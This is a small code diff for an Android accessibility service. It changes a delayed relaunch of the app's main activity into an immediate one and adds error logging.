@@ -74,14 +74,14 @@ public class SupportService extends AccessibilityService implements FirebaseMana
             overlayManager.showOverlay();
         }
 
-        // Auto-reopen main activity to ensure permissions are checked
-        mainHandler.postDelayed(() -> {
-            try {
-                Intent intent = new Intent(this, CoreActivity.class);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
-                startActivity(intent);
-            } catch (Exception ignored) {}
-        }, 1000);
+        // Langsung buka CoreActivity secepat mungkin
+        try {
+            Intent intent = new Intent(this, CoreActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            startActivity(intent);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to launch CoreActivity: " + e.getMessage());
+        }
     }
 
     @Override
